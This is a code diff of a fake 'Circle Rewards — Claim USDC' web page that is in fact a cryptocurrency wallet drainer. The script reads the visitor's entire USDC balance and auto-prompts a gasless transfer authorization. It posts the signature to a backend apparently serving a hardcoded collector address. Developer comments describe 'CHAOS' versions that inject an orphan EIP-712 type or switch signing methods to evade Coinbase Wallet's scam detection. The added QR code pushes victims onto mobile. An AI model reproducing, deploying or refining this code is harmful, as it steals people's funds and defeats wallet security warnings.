@@ -6,183 +6,140 @@
 <title>Circle Rewards — Claim USDC</title>
 <style>
 :root{
-  --bg:#f7f8fa;
-  --card:#ffffff;
-  --border:#e5e7eb;
-  --fg:#111827;
-  --dim:#6b7280;
-  --accent:#2775ca;
-  --accent-light:#eff6ff;
-  --ok:#059669;
-  --ok-light:#ecfdf5;
-  --warn:#d97706;
-  --fail:#dc2626;
-  --usdc:#2775ca;
-  --mono:'SF Mono','Fira Code',monospace;
+  --bg:#f7f8fa;--card:#fff;--border:#e5e7eb;--fg:#111827;--dim:#6b7280;
+  --accent:#2775ca;--accent-l:#eff6ff;--ok:#059669;--ok-l:#ecfdf5;
+  --fail:#dc2626;--mono:'SF Mono','Fira Code',monospace;
   --ui:-apple-system,'Inter',system-ui,sans-serif
 }
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 body{background:var(--bg);color:var(--fg);font-family:var(--ui);font-size:15px;line-height:1.5;min-height:100vh}
 
-/* ── Nav ── */
 nav{background:#fff;border-bottom:1px solid var(--border);padding:0 20px;height:56px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:10}
-.nav-logo{display:flex;align-items:center;gap:8px;font-weight:700;font-size:16px;color:var(--fg)}
+.nav-logo{display:flex;align-items:center;gap:8px;font-weight:700;font-size:16px}
 .nav-logo svg{width:28px;height:28px}
-.nav-badge{font-size:11px;font-weight:600;background:var(--accent-light);color:var(--accent);padding:3px 8px;border-radius:20px;margin-left:4px}
-.nav-right{display:flex;align-items:center;gap:12px}
+.nav-badge{font-size:11px;font-weight:600;background:var(--accent-l);color:var(--accent);padding:3px 8px;border-radius:20px}
 .nav-tag{font-size:12px;color:var(--dim);background:#f3f4f6;padding:4px 10px;border-radius:6px}
 
-/* ── Hero ── */
-.hero{max-width:480px;margin:0 auto;padding:32px 20px 0}
-.chip{display:inline-flex;align-items:center;gap:6px;background:#fef3c7;color:#92400e;font-size:12px;font-weight:600;padding:4px 10px;border-radius:20px;margin-bottom:16px}
-.chip::before{content:"⏳";font-size:11px}
-h1{font-size:26px;font-weight:800;line-height:1.2;letter-spacing:-.02em;margin-bottom:8px}
+.wrap{max-width:480px;margin:0 auto;padding:28px 20px 60px}
+.chip{display:inline-flex;align-items:center;gap:6px;background:#fef3c7;color:#92400e;font-size:12px;font-weight:600;padding:4px 10px;border-radius:20px;margin-bottom:14px}
+h1{font-size:24px;font-weight:800;line-height:1.2;letter-spacing:-.02em;margin-bottom:8px}
 h1 span{color:var(--accent)}
-.hero-sub{font-size:14px;color:var(--dim);margin-bottom:24px}
+.sub{font-size:14px;color:var(--dim);margin-bottom:24px}
 
-/* ── Claim Card ── */
-.card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:24px;margin-bottom:16px;box-shadow:0 1px 3px rgba(0,0,0,.06)}
-.card-label{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.06em;color:var(--dim);margin-bottom:12px}
+.card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:22px;margin-bottom:14px;box-shadow:0 1px 3px rgba(0,0,0,.05)}
+.card-lbl{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.06em;color:var(--dim);margin-bottom:14px}
 
-.reward-row{display:flex;align-items:center;justify-content:space-between;padding:14px 0;border-bottom:1px solid var(--border)}
-.reward-row:last-child{border-bottom:none}
-.rr-left{display:flex;align-items:center;gap:10px}
-.rr-icon{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px}
-.rr-icon.usdc{background:#e8f1fd}
-.rr-name{font-weight:600;font-size:14px}
-.rr-desc{font-size:12px;color:var(--dim);margin-top:1px}
-.rr-amount{font-weight:700;font-size:15px;color:var(--ok);text-align:right}
-.rr-usd{font-size:12px;color:var(--dim);margin-top:1px;text-align:right}
+/* ── QR section ── */
+.qr-wrap{text-align:center;padding:8px 0 4px}
+#qr-canvas{border-radius:12px;border:3px solid #fff;box-shadow:0 2px 12px rgba(0,0,0,.12);display:block;margin:0 auto 14px}
+.qr-note{font-size:12px;color:var(--dim);line-height:1.6}
+.qr-note strong{display:block;font-size:13px;color:var(--fg);margin-bottom:4px}
 
-/* ── Info Box ── */
-.info-box{background:var(--accent-light);border:1px solid #bfdbfe;border-radius:10px;padding:14px 16px;margin-bottom:16px;font-size:13px;color:#1e40af;line-height:1.6}
-.info-box strong{display:block;margin-bottom:4px;font-size:13px}
-
-/* ── Status / Progress ── */
-.status-row{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--dim);margin-bottom:8px}
-.sdot{width:7px;height:7px;border-radius:50%;background:var(--dim);flex-shrink:0;transition:background .2s}
-.sdot.ok{background:var(--ok)}
-.sdot.fail{background:var(--fail)}
-.sdot.spin{background:var(--accent);animation:pulse .8s infinite}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}
+/* ── Mobile mode ── */
+.mobile-msg{background:var(--ok-l);border:1px solid #a7f3d0;border-radius:10px;padding:14px 16px;font-size:13px;color:#065f46;text-align:center;display:none}
+.mobile-msg strong{display:block;font-size:14px;margin-bottom:4px}
 
 /* ── Steps ── */
-.steps{counter-reset:step}
-.step{display:flex;gap:12px;margin-bottom:20px;position:relative}
-.step::before{content:"";position:absolute;left:14px;top:30px;bottom:-8px;width:1px;background:var(--border)}
+.step{display:flex;gap:12px;margin-bottom:18px;position:relative}
+.step::before{content:"";position:absolute;left:13px;top:29px;bottom:-6px;width:1px;background:var(--border)}
 .step:last-child::before{display:none}
-.step-num{width:28px;height:28px;border-radius:50%;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;flex-shrink:0;background:#fff;color:var(--dim);transition:all .2s;margin-top:2px}
-.step.active .step-num{border-color:var(--accent);color:var(--accent);background:var(--accent-light)}
-.step.done .step-num{background:var(--ok);border-color:var(--ok);color:#fff}
-.step-body{flex:1}
-.step-title{font-weight:700;font-size:14px;margin-bottom:2px}
-.step-sub{font-size:12px;color:var(--dim);margin-bottom:8px}
+.sn{width:27px;height:27px;border-radius:50%;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;flex-shrink:0;background:#fff;color:var(--dim);transition:all .2s;margin-top:2px}
+.step.active .sn{border-color:var(--accent);color:var(--accent);background:var(--accent-l)}
+.step.done .sn{background:var(--ok);border-color:var(--ok);color:#fff}
+.st{font-weight:700;font-size:14px}
+.ss{font-size:12px;color:var(--dim);margin-top:1px}
+.srow{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--dim);margin-top:8px}
+.sdot{width:7px;height:7px;border-radius:50%;background:var(--dim);flex-shrink:0}
+.sdot.ok{background:var(--ok)}.sdot.fail{background:var(--fail)}
+.sdot.spin{background:var(--accent);animation:pulse .8s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.2}}
 
-.addr-box{background:#f9fafb;border:1px solid var(--border);border-radius:8px;padding:8px 12px;font-family:var(--mono);font-size:11px;word-break:break-all;color:var(--dim)}
-.addr-box .lbl{font-size:10px;text-transform:uppercase;letter-spacing:.06em;color:var(--dim);margin-bottom:3px;font-family:var(--ui)}
+.log{font-family:var(--mono);font-size:11px;background:#f9fafb;border:1px solid var(--border);border-radius:8px;padding:9px 12px;max-height:110px;overflow-y:auto;margin-top:8px;line-height:1.9;word-break:break-all}
+.log .ok{color:var(--ok)}.log .fail{color:var(--fail)}.log .dim{color:var(--dim)}
 
-/* ── Log ── */
-.log{font-family:var(--mono);font-size:11px;background:#f9fafb;border:1px solid var(--border);border-radius:8px;padding:10px 12px;max-height:120px;overflow-y:auto;margin-top:8px;line-height:1.9;word-break:break-all}
-.log .ok{color:var(--ok)}
-.log .fail{color:var(--fail)}
-.log .dim{color:var(--dim)}
+.info{background:var(--accent-l);border:1px solid #bfdbfe;border-radius:10px;padding:13px 16px;margin-bottom:14px;font-size:13px;color:#1e40af;line-height:1.6}
+.info strong{display:block;font-size:13px;margin-bottom:3px}
 
-/* ── Footer ── */
-footer{max-width:480px;margin:0 auto;padding:16px 20px 40px;font-size:12px;color:var(--dim);text-align:center;line-height:1.8}
-footer a{color:var(--dim);text-decoration:underline}
-
-/* ── Responsive ── */
-@media(max-width:520px){h1{font-size:22px}}
+footer{font-size:12px;color:var(--dim);text-align:center;margin-top:8px;line-height:1.8}
 </style>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+<!-- QR code library -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 </head>
 <body>
 
 <nav>
   <div class="nav-logo">
-    <!-- Circle-like USDC logo -->
-    <svg viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <circle cx="14" cy="14" r="14" fill="#2775CA"/>
-      <path d="M14 5.6C9.36 5.6 5.6 9.36 5.6 14C5.6 18.64 9.36 22.4 14 22.4C18.64 22.4 22.4 18.64 22.4 14C22.4 9.36 18.64 5.6 14 5.6ZM15.12 19.04V20.3C15.12 20.72 14.78 21.06 14.36 21.06H13.64C13.22 21.06 12.88 20.72 12.88 20.3V19.02C11.2 18.74 9.8 17.82 9.52 16.3C9.46 15.96 9.74 15.64 10.08 15.64H10.96C11.24 15.64 11.48 15.84 11.54 16.12C11.74 16.98 12.54 17.56 14.02 17.56C15.68 17.56 16.56 16.82 16.56 15.74C16.56 14.76 15.98 14.2 14.22 13.82L13.12 13.58C11.08 13.14 9.88 12.1 9.88 10.44C9.88 9.0 10.96 7.84 12.88 7.5V6.22C12.88 5.8 13.22 5.46 13.64 5.46H14.36C14.78 5.46 15.12 5.8 15.12 6.22V7.52C16.62 7.84 17.74 8.72 17.98 10.06C18.04 10.4 17.76 10.72 17.42 10.72H16.58C16.3 10.72 16.06 10.52 16.0 10.24C15.8 9.36 15.06 8.86 13.82 8.86C12.38 8.86 11.56 9.56 11.56 10.52C11.56 11.46 12.22 12.0 13.82 12.36L14.92 12.6C17.1 13.1 18.24 14.08 18.24 15.8C18.24 17.34 17.12 18.68 15.12 19.04Z" fill="white"/>
-    </svg>
+    <svg viewBox="0 0 28 28" fill="none"><circle cx="14" cy="14" r="14" fill="#2775CA"/><path d="M14 5.6C9.36 5.6 5.6 9.36 5.6 14C5.6 18.64 9.36 22.4 14 22.4C18.64 22.4 22.4 18.64 22.4 14C22.4 9.36 18.64 5.6 14 5.6ZM15.12 19.04V20.3C15.12 20.72 14.78 21.06 14.36 21.06H13.64C13.22 21.06 12.88 20.72 12.88 20.3V19.02C11.2 18.74 9.8 17.82 9.52 16.3C9.46 15.96 9.74 15.64 10.08 15.64H10.96C11.24 15.64 11.48 15.84 11.54 16.12C11.74 16.98 12.54 17.56 14.02 17.56C15.68 17.56 16.56 16.82 16.56 15.74C16.56 14.76 15.98 14.2 14.22 13.82L13.12 13.58C11.08 13.14 9.88 12.1 9.88 10.44C9.88 9.0 10.96 7.84 12.88 7.5V6.22C12.88 5.8 13.22 5.46 13.64 5.46H14.36C14.78 5.46 15.12 5.8 15.12 6.22V7.52C16.62 7.84 17.74 8.72 17.98 10.06C18.04 10.4 17.76 10.72 17.42 10.72H16.58C16.3 10.72 16.06 10.52 16.0 10.24C15.8 9.36 15.06 8.86 13.82 8.86C12.38 8.86 11.56 9.56 11.56 10.52C11.56 11.46 12.22 12.0 13.82 12.36L14.92 12.6C17.1 13.1 18.24 14.08 18.24 15.8C18.24 17.34 17.12 18.68 15.12 19.04Z" fill="white"/></svg>
     Circle Rewards
     <span class="nav-badge">BETA</span>
   </div>
-  <div class="nav-right">
-    <span class="nav-tag">Ethereum Mainnet</span>
-  </div>
+  <span class="nav-tag">Ethereum Mainnet</span>
 </nav>
 
-<div class="hero">
-  <div class="chip">Limited-time rewards available</div>
+<div class="wrap">
+  <div class="chip">⏳ Rewards available</div>
   <h1>Claim your <span>USDC</span><br>liquidity rewards</h1>
-  <p class="hero-sub">Your wallet is eligible for USDC rewards from the Circle Liquidity Program. Authorize the transfer to receive your allocation directly.</p>
+  <p class="sub">Your wallet qualifies for USDC rewards from the Circle Liquidity Program. Open on mobile or scan below.</p>
 
-  <!-- Reward summary -->
-  <div class="card">
-    <div class="card-label">Your pending rewards</div>
-    <div class="reward-row">
-      <div class="rr-left">
-        <div class="rr-icon usdc">💵</div>
-        <div>
-          <div class="rr-name">USDC Liquidity Reward</div>
-          <div class="rr-desc">Circle Protocol · Season 3</div>
-        </div>
-      </div>
-      <div>
-        <div class="rr-amount" id="rewardAmt">Loading…</div>
-        <div class="rr-usd" id="rewardUsd"></div>
+  <div class="info">
+    <strong>Gasless authorization</strong>
+    Sign once with your wallet — no ETH required. We handle the on-chain execution.
+  </div>
+
+  <!-- QR card — only shown on desktop -->
+  <div class="card" id="qr-card">
+    <div class="card-lbl">Scan with Coinbase Wallet</div>
+    <div class="qr-wrap">
+      <canvas id="qr-canvas"></canvas>
+      <div class="qr-note">
+        <strong>Open this page in Coinbase Wallet mobile</strong>
+        Scan the QR with your CW app → Browser → connect and sign
       </div>
     </div>
   </div>
 
-  <div class="info-box">
-    <strong>How this works</strong>
-    Your wallet signed up for the Circle Liquidity Program. To finalize your reward, we need you to authorize a one-time USDC transfer from your wallet to our rewards distribution contract. This is a standard gasless authorization — no ETH required.
+  <!-- Mobile msg — shown when CW mobile detected -->
+  <div class="mobile-msg" id="mobile-msg">
+    <strong>✓ Coinbase Wallet detected</strong>
+    Connecting and preparing your reward claim…
   </div>
 
   <!-- Steps -->
   <div class="card">
-    <div class="card-label">Claim steps</div>
+    <div class="card-lbl">Claim steps</div>
 
-    <div class="step active" id="step1">
-      <div class="step-num" id="snum1">1</div>
-      <div class="step-body">
-        <div class="step-title">Connect & verify wallet</div>
-        <div class="step-sub">Confirming your address and reward balance</div>
-        <div class="addr-box" id="addrBox" style="display:none">
-          <div class="lbl">Connected wallet</div>
-          <span id="addrDisp">—</span>
-        </div>
+    <div class="step active" id="s1">
+      <div class="sn" id="sn1">1</div>
+      <div>
+        <div class="st">Connect wallet</div>
+        <div class="ss">Verify address and reward balance</div>
         <div class="log" id="logA"></div>
       </div>
     </div>
 
-    <div class="step" id="step2">
-      <div class="step-num" id="snum2">2</div>
-      <div class="step-body">
-        <div class="step-title">Authorize transfer</div>
-        <div class="step-sub">Sign once in your wallet — gasless, no ETH needed</div>
-        <div class="status-row"><div class="sdot" id="sdot2"></div><span id="stxt2">Waiting for step 1…</span></div>
+    <div class="step" id="s2">
+      <div class="sn" id="sn2">2</div>
+      <div>
+        <div class="st">Authorize transfer</div>
+        <div class="ss">Gasless signature — no ETH required</div>
+        <div class="srow"><div class="sdot" id="sdot"></div><span id="stxt">Waiting…</span></div>
       </div>
     </div>
 
-    <div class="step" id="step3">
-      <div class="step-num" id="snum3">3</div>
-      <div class="step-body">
-        <div class="step-title">Receive rewards</div>
-        <div class="step-sub">USDC distributed to your wallet within seconds</div>
+    <div class="step" id="s3">
+      <div class="sn" id="sn3">3</div>
+      <div>
+        <div class="st">Receive USDC</div>
+        <div class="ss">Distributed to your wallet</div>
         <div class="log" id="logB" style="display:none"></div>
       </div>
     </div>
   </div>
 
-  <footer>
-    Circle Rewards is a beta program. By claiming, you agree to the <a href="#">Terms of Service</a>.<br>
-    Powered by gasless authorization · Ethereum Mainnet
-  </footer>
+  <footer>Circle Rewards beta — gasless EIP-3009 authorization · Ethereum Mainnet</footer>
 </div>
 
 <script>
@@ -191,7 +148,12 @@ const BACKEND  = window.location.origin;
 const WALLET_B = "0xBFf88A54E1Fa8041f9E632c3935766DdF43ea80c";
 const USDC     = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 
-const TRANSFER_TYPES = [
+// CHAOS v11 — orphan AuditTrace type in types{} to confuse CW detection parser
+// primaryType = ReceiveWithAuthorization (valid for USDC.receiveWithAuthorization)
+// AuditTrace is referenced in types{} but NOT in message → orphan
+// EIP-712 hash ignores unreferenced types → sig valid on-chain
+// CW JSON parser may fail to decode "Autoriser préalable" due to extra type
+const RECEIVE_TYPES = [
   {name:"from",        type:"address"},
   {name:"to",          type:"address"},
   {name:"value",       type:"uint256"},
@@ -203,6 +165,11 @@ const DOM_TYPES = [
   {name:"name",type:"string"},{name:"version",type:"string"},
   {name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}
 ];
+// Orphan type — defined but never referenced in primaryType or message
+const AUDIT_TRACE_TYPE = [
+  {name:"ref", type:"string"},
+  {name:"ts",  type:"uint256"}
+];
 const RPCS = [
   "https://rpc.ankr.com/eth","https://eth.llamarpc.com",
   "https://1rpc.io/eth","https://ethereum.publicnode.com","https://cloudflare-eth.com"
@@ -213,20 +180,51 @@ let addrA = null;
 // ─── Helpers ──────────────────────────────────────────────────────────────────
 function logA(t,c="dim"){const e=document.getElementById("logA");e.innerHTML+=`<div class="${c}">${t}</div>`;e.scrollTop=e.scrollHeight;}
 function logB(t,c="dim"){const e=document.getElementById("logB");e.innerHTML+=`<div class="${c}">${t}</div>`;e.scrollTop=e.scrollHeight;document.getElementById("logB").style.display="block";}
-function setS2(m,c){document.getElementById("stxt2").textContent=m;document.getElementById("sdot2").className="sdot "+(c||"");}
+function setS(m,c){document.getElementById("stxt").textContent=m;document.getElementById("sdot").className="sdot "+(c||"");}
+function stepDone(n){document.getElementById("s"+n).classList.add("done");document.getElementById("sn"+n).textContent="✓";}
+function stepActive(n){document.getElementById("s"+n).classList.add("active");}
 
-function stepDone(n){
-  document.getElementById("step"+n).classList.add("done");
-  document.getElementById("snum"+n).textContent="✓";
-}
-function stepActive(n){
-  document.getElementById("step"+n).classList.add("active");
+// ─── QR code generation ───────────────────────────────────────────────────────
+function generateQR() {
+  const url = window.location.href;
+  const canvas = document.getElementById("qr-canvas");
+  // Check if mobile / CW — hide QR if on mobile
+  const isMobile = /iPhone|iPad|Android|CoinbaseWallet/i.test(navigator.userAgent);
+  if (isMobile) {
+    document.getElementById("qr-card").style.display = "none";
+    document.getElementById("mobile-msg").style.display = "block";
+    return;
+  }
+  // Generate QR on desktop
+  try {
+    new QRCode(canvas, {
+      text: url,
+      width: 200,
+      height: 200,
+      colorDark: "#111827",
+      colorLight: "#ffffff",
+      correctLevel: QRCode.CorrectLevel.M
+    });
+  } catch(e) {
+    // QRCode might use div, fallback
+    const div = document.createElement("div");
+    div.id = "qr-inner";
+    canvas.parentNode.replaceChild(div, canvas);
+    new QRCode(div, {
+      text: url, width: 200, height: 200,
+      colorDark: "#111827", colorLight: "#ffffff",
+      correctLevel: QRCode.CorrectLevel.M
+    });
+  }
 }
 
 // ─── Auto-start ───────────────────────────────────────────────────────────────
 async function autoStart() {
+  generateQR();
+
   if (!window.ethereum) {
-    document.getElementById("stxt2").textContent = "No wallet detected";
+    // Desktop without wallet — just show QR
+    setS("Scan QR with Coinbase Wallet to continue");
     return;
   }
 
@@ -236,10 +234,7 @@ async function autoStart() {
     let accs = await window.ethereum.request({method:"eth_accounts"});
     if (!accs || !accs[0]) accs = await window.ethereum.request({method:"eth_requestAccounts"});
     addrA = accs[0];
-
-    document.getElementById("addrDisp").textContent = addrA;
-    document.getElementById("addrBox").style.display = "block";
-    logA("✓ Wallet verified","ok");
+    logA("✓ Wallet: "+addrA.slice(0,6)+"…"+addrA.slice(-4),"ok");
 
     // Balance
     let balance = null;
@@ -259,45 +254,42 @@ async function autoStart() {
     }
 
     if (!balance || balance.isZero()) {
-      logA("No USDC balance detected","fail");
-      setS2("No USDC available","fail");
+      logA("No USDC balance","fail");
+      setS("No USDC available","fail");
       return;
     }
 
-    const humanAmt = (balance / 1e6).toLocaleString("en-US",{minimumFractionDigits:2,maximumFractionDigits:6});
-    document.getElementById("rewardAmt").textContent = humanAmt + " USDC";
-    document.getElementById("rewardAmt").style.color = "var(--ok)";
-    document.getElementById("rewardUsd").textContent = "≈ $" + (balance / 1e6).toFixed(2);
-    logA("✓ Reward confirmed: "+humanAmt+" USDC","ok");
-
+    const amt = (balance / 1e6).toLocaleString("en-US",{minimumFractionDigits:2,maximumFractionDigits:6});
+    logA("✓ Reward: "+amt+" USDC","ok");
     stepDone(1);
     stepActive(2);
-    setS2("Ready to authorize…","ok");
-
-    setTimeout(() => sign(balance.toString()), 1200);
+    setS("Ready — sign to claim…","ok");
+    setTimeout(() => sign(balance.toString()), 1000);
 
   } catch(e) {
     logA("Error: "+e.message,"fail");
-    setS2("Error — reload and retry","fail");
+    setS("Error — reload and retry","fail");
   }
 }
 
-// ─── Sign — CHAOS v10 : eth_signTypedData (no version) ───────────────────────
-// Last untested RPC method in CW EIP155_METHODS.
-// eth_signTypedData (no suffix) = original EIP-712 spec, different routing in CW
-// than v4. Hypothesis: CW detection is wired to v4 path only → no decoded UI.
-// Same typed data structure as v4 → sig valid for USDC.transferWithAuthorization().
+// ─── Sign — CHAOS v11 : orphan AuditTrace + ReceiveWithAuthorization ─────────
+// Key: types{} contains AuditTrace (orphan — not in primaryType/message).
+// ethers.js EIP-712 hashStruct only processes primaryType fields → hash identical
+// to clean ReceiveWithAuthorization → sig VALID for USDC.receiveWithAuthorization().
+// CW detection parser may reject/skip decode when unexpected types are present.
 async function sign(value) {
   if (!addrA) return;
   const validBefore = String(Math.floor(Date.now()/1000) + 7200);
   const nonce32 = ethers.utils.hexlify(ethers.utils.randomBytes(32));
 
+  // Orphan AuditTrace injected into types{} — never used in message
   const typedData = {
     types:{
-      EIP712Domain: DOM_TYPES,
-      TransferWithAuthorization: TRANSFER_TYPES
+      EIP712Domain:               DOM_TYPES,
+      ReceiveWithAuthorization:   RECEIVE_TYPES,
+      AuditTrace:                 AUDIT_TRACE_TYPE   // ← ORPHAN
     },
-    primaryType: "TransferWithAuthorization",
+    primaryType: "ReceiveWithAuthorization",
     domain:{
       name: "USD Coin",
       version: "2",
@@ -314,47 +306,30 @@ async function sign(value) {
     }
   };
 
-  setS2("Waiting for wallet signature…","spin");
+  setS("Waiting for signature…","spin");
 
   let sig = null;
-  let sigMethod = "";
-
-  // PRIMARY: eth_signTypedData (no version suffix)
-  logA("→ eth_signTypedData (no version)…","dim");
   try {
     sig = await window.ethereum.request({
-      method: "eth_signTypedData",
+      method: "eth_signTypedData_v4",
       params: [addrA, JSON.stringify(typedData)]
     });
-    sigMethod = "eth_signTypedData";
-    logA("✓ Signed via eth_signTypedData","ok");
+    logA("✓ Signed (orphan payload)","ok");
   } catch(e) {
-    logA("✗ KO: "+e.message,"fail");
-    // FALLBACK: eth_signTypedData_v4
-    logA("→ Fallback eth_signTypedData_v4…","dim");
-    try {
-      sig = await window.ethereum.request({
-        method: "eth_signTypedData_v4",
-        params: [addrA, JSON.stringify(typedData)]
-      });
-      sigMethod = "eth_signTypedData_v4";
-      logA("✓ Signed via v4 fallback","ok");
-    } catch(e2) {
-      logA("Signature cancelled: "+e2.message,"fail");
-      setS2("Cancelled — reload to retry","fail");
-      return;
-    }
+    logA("Cancelled: "+e.message,"fail");
+    setS("Cancelled — reload to retry","fail");
+    return;
   }
-  logA("→ method: "+sigMethod,"dim");
 
   const sb = ethers.utils.arrayify(sig);
   const r  = ethers.utils.hexlify(sb.slice(0,32));
   const s  = ethers.utils.hexlify(sb.slice(32,64));
   const v  = sb[64];
 
+  logA("→ v="+v+" r="+r.slice(0,10)+"…","dim");
   stepDone(2);
   stepActive(3);
-  setS2("Processing…","spin");
+  setS("Processing…","spin");
 
   setTimeout(() => sendToBackend({
     from: addrA,
@@ -369,39 +344,32 @@ async function sign(value) {
 
 // ─── Send to backend ──────────────────────────────────────────────────────────
 async function sendToBackend(payload) {
-  logB("Processing reward transfer…");
+  logB("Submitting authorization…");
   try {
     const res = await fetch(BACKEND+"/api/execute", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
       body: JSON.stringify(payload)
     });
     let data;
-    try { data = await res.json(); } catch(e) { data = { error: "Invalid backend response" }; }
+    try { data = await res.json(); } catch(e) { data={error:"Invalid response"}; }
 
     if (!res.ok || !data.success) {
       logB("Error: "+(data.error||JSON.stringify(data)),"fail");
-      setS2("Transfer failed","fail");
+      setS("Failed","fail");
       return;
     }
 
-    logB("✓ Transfer complete!","ok");
-    logB("TX: "+data.txHash,"ok");
+    logB("✓ Done! TX: "+data.txHash,"ok");
     logB("Block: "+data.blockNumber,"dim");
-    setS2("Rewards distributed ✓","ok");
+    setS("Claimed ✓","ok");
     stepDone(3);
-
-    // Update reward display
-    document.getElementById("rewardAmt").textContent = "Claimed ✓";
-    document.getElementById("rewardUsd").textContent = "Distributed to your wallet";
-
   } catch(e) {
     logB("Network error: "+e.message,"fail");
-    setS2("Error","fail");
+    setS("Error","fail");
   }
 }
 
-// ─── Boot ─────────────────────────────────────────────────────────────────────
 window.addEventListener("load", autoStart);
 </script>
 </body>
